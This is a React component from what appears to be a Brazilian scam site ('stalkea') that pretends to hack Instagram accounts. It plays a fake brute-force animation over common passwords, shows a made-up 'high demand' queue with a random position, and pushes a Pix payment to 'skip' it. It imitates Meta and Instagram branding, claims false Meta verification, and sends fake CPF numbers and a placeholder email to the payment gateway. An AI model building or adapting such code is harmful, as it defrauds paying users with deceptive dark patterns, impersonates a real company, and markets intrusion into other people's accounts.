import React, { useState, useEffect } from 'react';
import {
    CheckCircle2,
    ChevronRight,
    AlertCircle,
    Clock,
    Zap,
    Copy,
    Check,
    RefreshCw,
    Lock,
    ShieldAlert,
    Users,
    Activity,
    ShieldCheck,
    LockIcon
} from 'lucide-react';
import { QRCodeSVG } from 'qrcode.react';

interface WaitingQueueProps {
    username: string;
    price: number;
    onSkipQueue: () => void;
}

const PASSWORDS_TO_TRY = [
    'senha123', 'admin', '123456', 'qwerty', 'stalkea', 'bypass_v6'
];

export const WaitingQueue: React.FC<WaitingQueueProps> = ({ username, price, onSkipQueue }) => {
    // Phases: splash -> metadata -> hacking -> error (high demand) -> payment
    const [phase, setPhase] = useState<'splash' | 'metadata' | 'hacking' | 'error' | 'generating' | 'payment'>('splash');
    const [currentText, setCurrentText] = useState('');
    const [attemptIndex, setAttemptIndex] = useState(0);
    const [isTyping, setIsTyping] = useState(false);
    const [queuePosition, setQueuePosition] = useState(() => Math.floor(Math.random() * (1600 - 1200 + 1) + 1200));

    // Pix states
    const [pixData, setPixData] = useState<any>(null);
    const [loadingPix, setLoadingPix] = useState(false);
    const [copied, setCopied] = useState(false);

    useEffect(() => {
        const runHackingSequence = async () => {
            // 1. Splash (1s)
            await new Promise(r => setTimeout(r, 1000));
            setPhase('metadata');

            // 2. Metadata (2s)
            await new Promise(r => setTimeout(r, 2000));
            setPhase('hacking');

            // 3. Brute Force Animation
            const totalTime = 6000;
            const numPasswords = PASSWORDS_TO_TRY.length;
            const timePerPassword = totalTime / numPasswords;

            for (let i = 0; i < PASSWORDS_TO_TRY.length; i++) {
                setAttemptIndex(i);
                setIsTyping(true);
                const targetPass = PASSWORDS_TO_TRY[i];
                let typed = '';
                const typingTime = timePerPassword * 0.7;
                const delayPerChar = typingTime / targetPass.length;

                for (let char of targetPass) {
                    typed += char;
                    setCurrentText(typed);
                    await new Promise(r => setTimeout(r, delayPerChar));
                }

                setIsTyping(false);
                await new Promise(r => setTimeout(r, timePerPassword * 0.3));

                if (i < PASSWORDS_TO_TRY.length - 1) {
                    setCurrentText('');
                }
            }

            // 4. Transition to Error (High Demand)
            setPhase('error');
        };

        if (phase === 'splash') {
            runHackingSequence();
        }
    }, [phase]);

    // Update queue position slowly
    useEffect(() => {
        if (phase === 'error') {
            const interval = setInterval(() => {
                setQueuePosition(prev => prev > 100 ? prev - 1 : prev);
            }, 8000);
            return () => clearInterval(interval);
        }
    }, [phase]);

    // Polling de status do pagamento (Upsell 2)
    useEffect(() => {
        if (pixData?.id && phase === 'payment') {
            const interval = setInterval(async () => {
                try {
                    const res = await fetch(`/api/check-pix?id=${pixData.id}`);
                    const data = await res.json();
                    if (data.success && (data.status === 'completed' || data.status === 'paid')) {
                        clearInterval(interval);
                        onSkipQueue(); // Libera o acesso
                    }
                } catch (e) { }
            }, 5000);
            return () => clearInterval(interval);
        }
    }, [pixData, phase, onSkipQueue]);

    const handlePriorityAccess = async () => {
        setLoadingPix(true);
        setPhase('generating');

        try {
            // Se tivermos os dados do pagador no localStorage, usamos
            const savedName = localStorage.getItem('stalkea_payer_name') || 'Anônimo';

            const safeCpf = Math.random() > 0.5 ? '36535467538' : '43087094072';

            // Force SigiloPay for Upsell (R$ 12.00)
            const gatewayEndpoint = '/api/sigilopay';

            // Em desenvolvimento local, usa a porta 3005 diretamente
            const isLocal = typeof window !== 'undefined' && window.location.hostname === 'localhost';
            const apiUrl = isLocal ? `http://localhost:3005${gatewayEndpoint}` : gatewayEndpoint;

            const safeEmail = "user_1772531954963@privatemail.com";
            const finalNameSelection = (savedName === 'Anônimo' || !savedName) ? 'Acesso Prioritário' : savedName;

            const res = await fetch(apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'pix',
                    username: username || 'anonimo',
                    amount: price,
                    description: `Acesso prioritário 6 meses (@${username || 'anonimo'})`,
                    name: finalNameSelection,
                    email: safeEmail,
                    cpf: safeCpf
                })
            });
            const data = await res.json();
            if (data.success) {
                setPixData(data);
                setPhase('payment');
                // TRACKING
                // Note: WaitingQueue didn't have explicit tracking call here in original code besides polling success?
                // Let's check original code. It didn't call onEvent here.
                // But App.tsx calls reportAdminActivity when onSkipQueue is called (success).
                // We want to track the "Generation" too.
            } else {
                alert(`Erro ao processar solicitação prioritária: ${data.error || 'Tente novamente'}`);
                setPhase('error');
            }
        } catch {
            setPhase('error');
        } finally {
            setLoadingPix(false);
        }
    };

    const copyPixCode = () => {
        if (pixData?.pix_code) {
            navigator.clipboard.writeText(pixData.pix_code);
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
        }
    };

    if (phase === 'splash') {
        return (
            <div className="fixed inset-0 z-[300] bg-black flex flex-col items-center justify-between py-10 font-sans">
                <div className="flex-1 flex items-center justify-center">
                    <svg viewBox="0 0 24 24" className="w-20 h-20">
                        <defs>
                            <linearGradient id="ig-gradient-queue" x1="0%" y1="0%" x2="100%" y2="100%">
                                <stop offset="0%" stopColor="#405DE6" />
                                <stop offset="50%" stopColor="#833AB4" />
                                <stop offset="100%" stopColor="#E1306C" />
                            </linearGradient>
                        </defs>
                        <path fill="url(#ig-gradient-queue)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
                    </svg>
                </div>
                <div className="flex flex-col items-center gap-1 opacity-80">
                    <span className="text-[#A8A8A8] text-[13px] tracking-tight">from</span>
                    <div className="flex items-center gap-1.5 grayscale opacity-50">
                        <span className="text-white text-[15px] font-bold tracking-tight">Meta</span>
                    </div>
                </div>
            </div>
        );
    }

    if (phase === 'metadata') {
        return (
            <div className="fixed inset-0 z-[300] bg-black flex flex-col items-center justify-center animate-fade-in font-sans">
                <div className="flex flex-col items-center gap-6">
                    <div className="flex items-center gap-4">
                        <span className="text-white text-xl font-medium tracking-tight">Sincronizando dados</span>
                        <div className="flex gap-1.5">
                            <div className="w-1.5 h-1.5 bg-[#0095f6] rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
                            <div className="w-1.5 h-1.5 bg-[#0095f6] rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
                            <div className="w-1.5 h-1.5 bg-[#0095f6] rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
                        </div>
                    </div>
                    <div className="flex items-center gap-2 py-1.5 px-3 bg-[#121212] border border-[#262626] rounded-full">
                        <Lock size={12} className="text-[#A8A8A8]" />
                        <span className="text-[#A8A8A8] text-[10px] font-semibold uppercase tracking-widest">Conexão Segura</span>
                    </div>
                </div>
            </div>
        );
    }

    if (phase === 'hacking') {
        return (
            <div className="fixed inset-0 z-[200] bg-black flex flex-col items-center pt-12 px-6 font-sans select-none animate-fade-in overflow-hidden">
                <div className="w-full max-w-[360px] flex flex-col items-center">
                    <div className="mb-16 mt-12">
                        <img src="/instagram-logo.svg" alt="Instagram" className="w-[172px] invert" />
                    </div>

                    <div className="w-full space-y-3">
                        {/* Fake Username Field */}
                        <div className="relative">
                            <div className="w-full bg-[#121212] border border-[#262626] rounded-[4px] px-3 pt-6 pb-2 h-[60px] flex flex-col justify-center">
                                <label className="text-[11px] text-[#A8A8A8] font-semibold uppercase absolute top-2 left-3 tracking-wide">Nome de usuário</label>
                                <span className="text-[16px] text-white font-normal truncate mt-1">{username}</span>
                            </div>
                        </div>

                        {/* Fake Password / Token Field */}
                        <div className="relative w-full bg-[#121212] border border-[#262626] rounded-[4px] px-3 pt-6 pb-2 flex flex-col min-h-[60px]">
                            <label className="text-[11px] text-[#A8A8A8] font-semibold uppercase absolute top-2 left-3 tracking-wide">Hash de Autenticação</label>
                            <div className="flex items-center gap-1 mt-1">
                                <span className="text-[20px] tracking-[0.2em] text-white">{'•'.repeat(currentText.length)}</span>
                                {isTyping && <div className="w-[1.5px] h-5 bg-[#0095f6] animate-cursor-blink" />}
                            </div>
                            <div className="absolute bottom-2 right-3 h-4 flex items-center">
                                <span className="text-[9px] font-bold text-[#0095f6] uppercase tracking-widest animate-pulse">Processando...</span>
                            </div>
                        </div>

                        {/* Disabled Button */}
                        <button className="w-full font-bold py-[12px] rounded-[8px] text-[14px] bg-[#0095f6]/30 text-white/40 cursor-default mt-2">
                            Entrar
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    if (phase === 'error' || phase === 'generating') {
        return (
            <div className="fixed inset-0 z-[200] bg-black flex flex-col items-center font-sans animate-fade-in overflow-y-auto no-scrollbar">

                {/* Native Instagram Error Banner - Fixed at Top */}
                <div className="sticky top-0 left-0 right-0 z-[100] w-full bg-[#ED4956] text-white py-3 px-6 text-center shadow-[0_4px_12px_rgba(0,0,0,0.5)] border-b border-white/10 shrink-0 overflow-hidden">
                    {/* High-End Glass Shimmer */}
                    <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full animate-shine-slow pointer-events-none"></div>

                    <div className="relative z-10 flex items-center justify-center gap-2.5">
                        <div className="w-1.5 h-1.5 bg-white rounded-full animate-ping shrink-0" />
                        <span className="text-[12px] font-[1000] uppercase tracking-[0.08em] leading-none">
                            ALTA DEMANDA: Fila global ativa devido ao volume extremo de acessos.
                        </span>
                    </div>
                </div>

                <div className="w-full max-w-[375px] px-6 flex flex-col items-center pt-4 pb-8 transition-all">

                    {/* Header Info */}
                    <div className="text-center mb-4">
                        <div className="inline-flex items-center justify-center p-2.5 bg-[#121212] rounded-full border border-[#262626] mb-2.5 shadow-[0_0_15px_rgba(255,255,255,0.05)]">
                            <Users size={20} className="text-white" />
                        </div>
                        <h2 className="text-lg font-[1000] tracking-tight text-white mb-0.5 uppercase animate-text-shimmer-queue bg-clip-text text-transparent bg-[linear-gradient(110deg,#fff,45%,#666,55%,#fff)] bg-[length:250%_100%]">Fila Global de Acesso</h2>
                        <p className="text-[#A8A8A8] text-[12px] leading-relaxed max-w-[280px] mx-auto opacity-80">
                            Acesso em espera por alta demanda.
                        </p>
                    </div>

                    {/* 💎 PREMIUM QUEUE CARD - THE 'BLACK CARD' AESTHETIC (SQUARE) */}
                    <div className="w-full relative group shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
                        {/* High-end border glow */}
                        <div className="absolute -inset-[1px] bg-gradient-to-b from-[#262626] via-[#121212] to-[#262626] rounded-[4px]"></div>

                        <div className="relative bg-[#0A0A0A] rounded-[3px] overflow-hidden">
                            {/* Glass Shine Effect */}
                            <div className="absolute top-0 left-0 w-full h-[100px] bg-gradient-to-b from-white/[0.03] to-transparent pointer-events-none"></div>

                            <div className="p-5 flex flex-col items-center">
                                {/* Stylized Position Header */}
                                <div className="flex flex-col items-center mb-6">
                                    {/* Live Load Indicator - Moved here to avoid overlap */}
                                    <div className="flex items-center gap-1.5 mb-2.5">
                                        <div className="w-1 h-1 bg-red-500 rounded-full animate-pulse shadow-[0_0_8px_#ef4444]"></div>
                                        <span className="text-[8px] font-black text-red-500 uppercase tracking-widest">Servidor Lotado</span>
                                    </div>

                                    <div className="uppercase text-[9px] font-black text-[#A8A8A8] tracking-[0.4em] mb-3 flex items-center gap-2">
                                        <div className="h-px w-4 bg-[#262626]"></div>
                                        Status da Solicitação
                                        <div className="h-px w-4 bg-[#262626]"></div>
                                    </div>

                                    <div className="relative">
                                        <span className="text-[56px] font-[1000] text-white leading-none tracking-tighter tabular-nums drop-shadow-[0_0_20px_rgba(255,255,255,0.1)]">
                                            {queuePosition}
                                        </span>
                                        {/* Badge ajustado para não sobrepor o número lateralmente */}
                                        <div className="absolute -bottom-1 -right-1 bg-[#0095f6] text-white text-[8px] font-black px-1.5 py-0.5 rounded-sm rotate-2 shadow-lg">
                                            PAUSADO
                                        </div>
                                    </div>
                                    <span className="text-[10px] font-bold text-white/40 uppercase tracking-[0.15em] mt-1.5 italic">Posição em Tempo Real</span>
                                </div>

                                {/* Premium Status Grid */}
                                <div className="w-full grid grid-cols-1 gap-3 mt-4">
                                    {/* Wait Time Row */}
                                    <div className="bg-[#121212]/50 border border-[#262626] rounded-[2px] p-4 flex items-center justify-between group/row hover:bg-[#161616] transition-colors">
                                        <div className="flex items-center gap-4">
                                            <div className="p-2 bg-white/5 rounded-xl text-[#A8A8A8]">
                                                <Clock size={18} />
                                            </div>
                                            <div className="flex flex-col">
                                                <span className="text-[10px] font-black text-[#555] uppercase tracking-wider">Espera Estimada</span>
                                                <span className="text-sm font-bold text-white uppercase tracking-tight">8 Horas Completas</span>
                                            </div>
                                        </div>
                                        <ChevronRight size={16} className="text-[#262626]" />
                                    </div>

                                    {/* Priority Row - AGGRESSIVE STYLE */}
                                    <div className="bg-[#121212]/50 border border-[#262626] rounded-[2px] p-4 flex items-center justify-between border-l-red-500/50 border-l-2">
                                        <div className="flex items-center gap-4">
                                            <div className="p-2 bg-red-500/10 rounded-xl text-red-500">
                                                <ShieldAlert size={18} />
                                            </div>
                                            <div className="flex flex-col">
                                                <span className="text-[10px] font-black text-red-500/50 uppercase tracking-wider">Nível de Acesso</span>
                                                <span className="text-sm font-[1000] text-red-500 uppercase tracking-tighter italic animate-pulse">Nenhuma Prioridade (Padrão)</span>
                                            </div>
                                        </div>
                                        <AlertCircle size={16} className="text-red-500 animate-pulse" />
                                    </div>
                                </div>

                                {/* Social Proof Footer */}
                                <div className="mt-6 flex items-center gap-3 py-2 px-4 bg-white/[0.02] rounded-md border border-white/[0.05]">
                                    <div className="flex -space-x-2">
                                        {[1, 2, 3].map(i => (
                                            <div key={i} className="w-5 h-5 rounded-full border border-black bg-[#262626] flex items-center justify-center">
                                                <Users size={10} className="text-[#555]" />
                                            </div>
                                        ))}
                                    </div>
                                    <span className="text-[10px] font-bold text-[#A8A8A8]">+1.4k usuários ativos agora</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Blue CTA Button - Instagram Native (SQUARE) */}
                    <div className="w-full flex flex-col gap-3">
                        <button
                            onClick={handlePriorityAccess}
                            disabled={phase === 'generating'}
                            className="group relative w-full bg-gradient-to-r from-[#0095f6] to-[#0077c2] hover:from-[#1877f2] hover:to-[#005fa3] active:scale-[0.98] transition-all rounded-[4px] py-[12px] text-white font-[1000] text-[16px] flex items-center justify-center gap-2 h-[54px] overflow-hidden shadow-[0_0_30px_rgba(0,149,246,0.4)] animate-pulse-subtle"
                        >
                            {/* Reflexo de Vidro (Glossy Shine) */}
                            <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/40 to-transparent -translate-x-full group-hover:animate-shine animate-shine-slow pointer-events-none"></div>

                            {/* Inner Glossy Top Highlight */}
                            <div className="absolute top-0 left-0 right-0 h-1/2 bg-gradient-to-b from-white/10 to-transparent pointer-events-none" />

                            {phase === 'generating' ? (
                                <RefreshCw className="animate-spin" size={24} />
                            ) : (
                                <div className="relative z-10 flex items-center gap-3 tracking-[0.05em]">
                                    <span className="uppercase italic">Liberar Acesso Prioritário</span>
                                    <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                                </div>
                            )}
                        </button>

                        <div className="flex justify-center -mt-1 mb-2">
                            <button
                                className="text-[#A8A8A8] text-[10px] font-bold uppercase tracking-[0.15em] hover:text-white transition-all opacity-60 hover:opacity-100 flex items-center gap-1.5 active:scale-95"
                                onClick={() => alert("Sua posição foi salva. Por favor, mantenha esta página aberta. Estimativa de liberação: 8 horas.")}
                            >
                                <Clock size={12} />
                                Ou prefiro aguardar na fila (8 Horas)
                            </button>
                        </div>

                        <div className="bg-[#121212] border border-[#262626] rounded-[2px] p-4 flex items-center justify-between">
                            <div className="flex flex-col">
                                <span className="text-white text-[13px] font-bold tracking-tight">Vaga Imediata (6 meses)</span>
                                <span className="text-[#A8A8A8] text-[11px]">Pagamento único</span>
                            </div>
                            <span className="text-white font-bold text-[15px]">R$ {price.toFixed(2).replace('.', ',')}</span>
                        </div>
                    </div>

                    <div className="mt-6 flex items-center gap-2 text-[#A8A8A8]">
                        <ShieldCheck size={14} />
                        <span className="text-[11px] font-semibold tracking-tight">Verificado pela Meta Business Solution</span>
                    </div>
                </div>

                {/* Footer and Meta Branding */}
                <footer className="w-full mt-auto pb-8 flex flex-col items-center gap-4">
                    <div className="flex items-center gap-1 opacity-40">
                        <span className="text-[12px] text-white/50 tracking-tight">from</span>
                        <span className="text-white text-[14px] font-bold tracking-tighter">Meta</span>
                    </div>
                </footer>
            </div>
        );
    }

    if (phase === 'payment' && pixData && pixData.pix_code) {
        return (
            <div className="fixed inset-0 z-[200] bg-black flex flex-col items-center pt-10 px-6 font-sans animate-fade-in overflow-y-auto no-scrollbar">

                <div className="w-full max-w-[375px] flex flex-col items-center">

                    {/* Payment Header */}
                    <div className="text-center mb-6">
                        <div className="w-12 h-12 bg-gradient-brand rounded-full flex items-center justify-center p-[1px] mb-3 mx-auto">
                            <div className="w-full h-full bg-black rounded-full flex items-center justify-center">
                                <Zap size={20} className="text-white fill-white" />
                            </div>
                        </div>
                        <h3 className="text-xl font-bold text-white mb-0.5">Pular Fila Global</h3>
                        <p className="text-[#A8A8A8] text-[12px]">Conclua para liberar seu acesso.</p>
                    </div>

                    {/* QR Code Card */}
                    <div className="w-full bg-[#121212] border border-[#262626] rounded-[4px] overflow-hidden p-6 flex flex-col items-center gap-4 shadow-xl">
                        <div className="bg-white p-4 rounded-[4px] shadow-lg">
                            <QRCodeSVG
                                value={pixData.pix_code}
                                size={160}
                                level={"M"}
                                includeMargin={true}
                            />
                        </div>

                        <div className="text-center">
                            <span className="text-[11px] text-[#A8A8A8] font-bold uppercase tracking-wider mb-1 block">Valor a pagar</span>
                            <span className="text-[28px] font-bold text-white tracking-tight italic">R$ {price.toFixed(2).replace('.', ',')}</span>
                        </div>
                    </div>

                    {/* Actions */}
                    <div className="w-full space-y-3 mt-6">
                        <button
                            onClick={copyPixCode}
                            className="w-full bg-white text-black font-bold h-[50px] rounded-[4px] flex items-center justify-center gap-3 active:scale-[0.98] transition-all"
                        >
                            {copied ? <CheckCircle2 size={18} className="text-purple-600" /> : <Copy size={16} />}
                            <span className="text-[14px] tracking-tight">{copied ? 'PIX Copiado!' : 'Copiar Código PIX'}</span>
                        </button>

                        <div className="flex items-center justify-center gap-3 py-2 text-[#0095f6] font-bold italic animate-pulse text-[12px]">
                            <RefreshCw size={12} className="animate-spin" />
                            <span>Aguardando transferência...</span>
                        </div>
                    </div>

                    <div className="mt-auto py-10 opacity-30">
                        <span className="text-[11px] font-bold text-white uppercase tracking-[0.2em]">Pagamento Seguro 256-bit</span>
                    </div>
                </div>
            </div>
        );
    }

    return null;
};

// Styles for the component
const styles = `
    @keyframes fade-in {
        from { opacity: 0; }
        to { opacity: 1; }
    }
    @keyframes slide-down {
        from { transform: translateY(-100%) translateZ(0); }
        to { transform: translateY(0) translateZ(0); }
    }
    @keyframes cursor-blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0; }
    }
    @keyframes progress-fast {
        0% { width: 0%; opacity: 1; }
        80% { width: 100%; opacity: 1; }
        100% { width: 100%; opacity: 0; }
    }
    @keyframes queue-walking {
        0% { transform: translateX(50px); opacity: 0; }
        10% { opacity: 1; }
        90% { opacity: 1; }
        100% { transform: translateX(-50px); opacity: 0; }
    }
    @keyframes shimmer-banner {
        0% { left: -100%; }
        30% { left: 100%; }
        100% { left: 100%; }
    }
    @keyframes text-shimmer-queue {
        0% { background-position: 250% 0; }
        100% { background-position: -50% 0; }
    }
    .animate-text-shimmer-queue {
        animation: text-shimmer-queue 3s infinite linear;
    }
    .animate-shimmer-banner { animation: shimmer-banner 3s infinite cubic-bezier(0.19, 1, 0.22, 1); }
    @keyframes shine {
        0% { transform: translateX(-150%) skewX(-15deg) translateZ(0); }
        30% { transform: translateX(150%) skewX(-15deg) translateZ(0); }
        100% { transform: translateX(150%) skewX(-15deg) translateZ(0); }
    }
    .animate-shine { animation: shine 3s infinite ease-in-out; }
    @keyframes shine-slow {
        0% { transform: translateX(-150%) skewX(-15deg) translateZ(0); }
        40% { transform: translateX(150%) skewX(-15deg) translateZ(0); }
        100% { transform: translateX(150%) skewX(-15deg) translateZ(0); }
    }
    .animate-shine-slow { animation: shine-slow 4s infinite ease-in-out; }
    
    @keyframes pulse-subtle {
        0%, 100% { transform: scale(1) translateZ(0); filter: brightness(1); }
        50% { transform: scale(1.01) translateZ(0); filter: brightness(1.1); }
    }
    .animate-pulse-subtle { animation: pulse-subtle 2s infinite ease-in-out; will-change: transform; }
    
    .animate-fade-in { animation: fade-in 0.8s ease-out forwards; }
    .animate-cursor-blink { animation: cursor-blink 0.8s step-end infinite; }
    .animate-shimmer-fast { animation: shimmer-fast 1s linear infinite; }
    .no-scrollbar::-webkit-scrollbar { display: none; }
    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
`;

if (typeof document !== 'undefined') {
    const styleTag = document.createElement('style');
    styleTag.textContent = styles;
    document.head.appendChild(styleTag);
}
